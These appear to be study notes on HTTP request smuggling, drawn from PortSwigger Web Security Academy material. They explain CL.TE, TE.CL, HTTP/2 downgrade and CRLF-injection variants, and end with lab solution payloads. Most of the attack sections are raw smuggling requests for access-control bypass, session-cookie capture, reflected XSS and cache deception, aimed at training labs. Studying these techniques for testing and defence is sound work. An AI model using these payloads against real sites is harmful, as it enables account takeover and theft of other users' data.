# HTTP request smuggling

## **How do HTTP request smuggling vulnerabilities arise?**

<aside>
💡

 Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture. 

</aside>

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.

The `Content-Length` header is straightforward: it specifies the length of the message body in bytes

The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero.

## How to perform an HTTP request smuggling attack

Classic request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

- CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
- TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
- TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

> 
> 
> 
> **NOTE:** 
> 
> These techniques are only possible using HTTP/1 requests. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it during the TLS handshake.
> 
> As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. You can do this from the **Request attributes** section of the **Inspector** panel.
> 

### **CL.TE vulnerabilities**

Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end server processes the `Content-Length` header and determines that the request body is 13 bytes long, up to the end of `SMUGGLED`. This request is forwarded on to the back-end server.

The back-end server processes the `Transfer-Encoding`header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

### **TE.CL vulnerabilities**

Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

> **NOTE:**
> 
> 
> To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
> 
> You need to include the trailing sequence `\r\n\r\n` following the final `0`.
> 

The front-end server processes the `Transfer-Encoding`header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.

The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

### **TE.TE behavior: obfuscating the TE header**

Here, the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Each of these techniques involves a subtle departure from the HTTP specification. Real-world code that implements a protocol specification rarely adheres to it with absolute precision, and it is common for different implementations to tolerate different variations from the specification. To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated `Transfer-Encoding` header, the remainder of the attack will take the same form as for the CL.TE or [TE.CL](http://TE.CL) vulnerabilities already described.

## **Finding HTTP request smuggling vulnerabilities**

### **Finding CL.TE vulnerabilities using timing techniques**

If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

### **Finding TE.CL vulnerabilities using timing techniques**

If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

### **Confirming CL.TE vulnerabilities using differential responses**

To confirm a CL.TE vulnerability, you would send an attack request like this:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received

### **Confirming TE.CL vulnerabilities using differential responses**

To confirm a TE.CL vulnerability, you would send an attack request like this:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

> 
> 
> 
> **NOTE:**
> 
> To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
> 
> You need to include the trailing sequence `\r\n\r\n` following the final `0`.
> 

If the attack is successful, then everything from `GET /404` onwards is treated by the back-end server as belonging to the next request that is received. 
        

## **Exploiting HTTP request smuggling vulnerabilities**

### **Using HTTP request smuggling to bypass front-end security controls**

In some applications, the front-end web server is used to implement some security controls, deciding whether to allow individual requests to be processed. Allowed requests are forwarded to the back-end server, where they are deemed to have passed through the front-end controls. 

Suppose the current user is permitted to access `/home` but not `/admin`. They can bypass this restriction using the following request smuggling attack:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the back-end server. However, the back-end server sees one request for `/home` and one request for `/admin`. It assumes (as always) that the requests have passed through the 
front-end controls, and so grants access to the restricted URL.

### **Revealing front-end request rewriting**

In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers. For example, the front-end server might: 

- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an `X-Forwarded-For` header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed
directly by a normal request whose rewritten form you want to reveal.

> **NOTE:**
Since the final request is being rewritten, you don't know how long it will end up. The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.
> 

### **Bypassing client authentication**

The component that authenticates the client typically passes the relevant details from the certificate to the application or back-end server via one or more non-standard HTTP headers. For example, front-end servers sometimes append a header containing the client's CN to any incoming requests:

```
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

As these headers are supposed to be completely hidden from users, they are often implicitly trusted by back-end servers. Assuming you're able to send the right combination of headers and values, this may enable you to bypass access controls. 

### **Capturing other users' requests**

If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on. 

Example:

```markdown
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=token&postId=1&name=Carlos+Montoya&email=carlos@normal-user.net&website=http://website.com&comment=
```

> **NOTE:**
If the stored request is incomplete and doesn't include the Cookie header, you will need to slowly increase the value of the Content-Length header in the smuggled request, until the whole cookie is captured.
> 

### **Using HTTP request smuggling to exploit reflected XSS**

If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application. This approach is superior to normal exploitation of reflected XSS in two ways:

- It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.

### **Using HTTP request smuggling to turn an on-site redirect into an open redirect**

Many applications perform on-site redirects from one URL to another and place the hostname from the request's `Host` header into the redirect URL. An example of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

This behavior is normally considered harmless, but it can be exploited in a request smuggling attack to redirect other users to an external domain. For example: 

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

#### **Turning root-relative redirects into open redirects**

In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL for the `Location` header, for example:

```
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path:

```
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

### **Using HTTP request smuggling to perform web cache poisoning**

In a variation of the preceding attack, it might be possible to exploit HTTP request smuggling to perform a web cache poisoning attack. If any part of the front-end infrastructure performs caching of content (generally for performance reasons), then it might be possible to poison the cache with the off-site redirect response. This will make the attack persistent, affecting any user who subsequently requests the affected URL. 

### **Using HTTP request smuggling to perform web cache deception**

In yet another variant of the attack, you can leverage HTTP request smuggling to perform web cache deception. This works in a similar way to the web cache poisoning attack but with a different purpose.

What is the difference between web cache poisoning and web cache deception?

- In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
- In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

## **Advanced request smuggling**

### **H2.CL vulnerabilities**

The spec dictates that any `content-length` header in an HTTP/2 request must match the length calculated using the built-in mechanism, but this isn't always validated properly before 
downgrading. As a result, it may be possible to smuggle requests by injecting a misleading `content-length` header. Although the front-end will use the implicit HTTP/2 length to determine where the request ends, the HTTP/1 back-end has to refer to the `Content-Length` header derived from your injected one, resulting in a desync.
        

**Front-end (HTTP/2)**

```markdown
:method 	POST
:path 	/example
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
content-length 	0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

**Back-end (HTTP/1)**

```markdown
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

### **H2.TE vulnerabilities**

Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and subsequently downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks.

**Front-end (HTTP/2)**

```markdown
:method 	POST
:path 	/example
:authority 	vulnerable-website.com
content-type 	application/x-www-form-urlencoded
transfer-encoding 	chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

**Back-end (HTTP/1)**

```markdown
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

### Hidden HTTP/2 support

Browsers and other clients, including Burp, typically only use HTTP/2 to communicate with servers that explicitly advertise support for it via ALPN as part of the TLS handshake.

Some servers support HTTP/2 but fail to declare this properly due to misconfiguration. In such cases, it can appear as though the server only supports HTTP/1.1 because clients default to this as a fallback option. As a result, testers may overlook viable HTTP/2 attack surface and miss protocol-level issues, such as the examples of HTTP/2 downgrade-based request smuggling that we covered above.

To force Burp Repeater to use HTTP/2 so that you can test for this misconfiguration manually:

1. From the **Settings** dialog, go to **Tools > Repeater**.
2. Under **Connections**, enable the **Allow HTTP/2 ALPN override** option.
3. In Repeater, go to the **Inspector** panel and expand the **Request attributes** section.
4. Use the switch to set the **Protocol** to **HTTP/2**. Burp will now send all requests on this tab using HTTP/2, regardless of whether the server advertises support for this.

> **NOTE:**
> 
> 
> If you're using Burp Suite Professional, Burp Scanner automatically detects instances of hidden HTTP/2 support.
> 

### **Response queue poisoning**

Response queue poisoning is a powerful request smuggling attack that enables you to steal arbitrary responses intended for other users, potentially compromising their accounts and even the entire site. 

![image.png](HTTP%20request%20smuggling/image.png)

> **NOTE:**
This attack is possible both via classic HTTP/1 request smuggling and by exploiting HTTP/2 downgrading.
> 

### **Request smuggling via CRLF injection**

Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the `content-length` or stripping any `transfer-encoding` headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.

In HTTP/1, you can sometimes exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.

```
Foo: bar\nTransfer-Encoding: chunked
```

This discrepancy doesn't exist with the handling of a full CRLF (`\r\n`) sequence because all HTTP/1 servers agree that this terminates the header.

On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that `\r\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split:

| foo | bar\r\nTransfer-Encoding: chunked |
| --- | --- |

This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:

```
Foo: bar
Transfer-Encoding: chunked
```

[HTTP/2-exclusive vectors | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors)

### **HTTP/2 request splitting**

To split a request in the headers, you need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.

For example, you need to ensure that both requests received by the back-end contain a `Host` header. Front-end servers typically strip the `:authority` pseudo-header and replace it with a new HTTP/1 `Host` header during downgrading. There are different approaches for doing this, which can influence where you need to position the `Host` header that you're injecting.

During rewriting, some front-end servers append the new `Host` header to the end of the current list of headers. As far as an HTTP/2 front-end is concerned, this after the `foo` header. Note that this is also after the point at which the request will be split on the back-end. This means that the first request would have no `Host` header at all, while the smuggled request would have two. In this case, you need to position your injected `Host` header so that it ends up in the first request once the split occurs:

| :method | GET |  |  |  |
| --- | --- | --- | --- | --- |
| :path | / |  |  |  |
| :authority | vulnerable-website.com |  |  |  |
| foo | bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1 |  |  |  |

### **HTTP request tunnelling**

[HTTP request tunnelling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling)

### **0.CL request smuggling**

0.CL desync attacks occur when the front-end server ignores a `Content-Length` header that the back-end server processes. This scenario was long considered unexploitable due to connection deadlocks between servers.

However, by combining a 0.CL attack with an early-response gadget - a technique to make the back-end respond before receiving the complete request body - attackers can break the deadlock, then use a double desync to build a full exploit. This breakthrough enables the 
exploitation of 0.CL scenarios.

For more technical details, see the accompanying whitepaper: [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die).

## **Browser-powered request smuggling**

### **CL.0 request smuggling**

[CL.0 request smuggling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/browser/cl-0)

### **Client-side desync attacks**

[Client-side desync attacks | Web Security Academy](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)

### **Pause-based desync attacks**

[Pause-based desync attacks | Web Security Academy](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync)

## Labs

### Performing an attack

[**HTTP request smuggling, basic CL.TE vulnerability**](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: ID.web-security-academy.net
X-Ignore: X
```

[**HTTP request smuggling, basic TE.CL vulnerability**](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

9d
GPOST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

[**HTTP request smuggling, obfuscating the TE header**](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Length: 99
Transfer-Encoding: identity
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: ID.web-security-academy.net
X-Ignore: X
```

### Identifying vulnerabilities

[**HTTP request smuggling, confirming a CL.TE vulnerability via differential responses**](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 30

0

GET /404 HTTP/1.1
Foo: x
```

[**HTTP request smuggling, confirming a TE.CL vulnerability via differential responses**](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

9e
GET /404 HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

### Exploiting vulnerabilities

[**Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

foo=
```

[**Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

70
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

[**Exploiting HTTP request smuggling to reveal front-end request rewriting**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 176
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=reflected+
```

[**Exploiting HTTP request smuggling to capture other users' requests**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 310
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=sessToken
Content-Length: 920

csrf=csrfToken&postId=1&name=user&email=test@&website=&comment=
```

[**Exploiting HTTP request smuggling to deliver reflected XSS**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Foo: X
```

[**Exploiting HTTP request smuggling to perform web cache poisoning**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)

[**Exploiting HTTP request smuggling to perform web cache deception**](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)

```markdown
POST / HTTP/1.1
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: X

--------------------------------------------------------------------------------

GET /resources/js/tracking.js HTTP/1.1
Host: ID.web-security-academy.net
```

### Advanced request smuggling

[**H2.CL request smuggling**](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

```markdown
POST / HTTP/2
Host: ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-ID.exploit-server.net
Content-Length: 10

foo=
```

[**Response queue poisoning via H2.TE request smuggling**](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

```markdown
POST / HTTP/2
Host: ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: ID.web-security-academy.net

```

[**HTTP/2 request smuggling via CRLF injection**](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)

```markdown
# Using the Inspector, add an arbitrary header to the request. Append the.      sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:
***Name***
foo

***Value***
bar\r\n
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: ID.web-security-academy.net
Cookie: session=sessID
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

search=test
```

[**HTTP/2 request splitting via CRLF injection**](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)

```markdown
# Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject \r\n sequences to split the request so that you're     smuggling another request to a non-existent endpoint as follows:

***Name***
foo

***Value***
bar\r\n
Host: ID.web-security-academy.net\r\n
\r\n
GET /x HTTP/1.1
```

### **Browser-powered request smuggling**

[**CL.0 request smuggling**](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)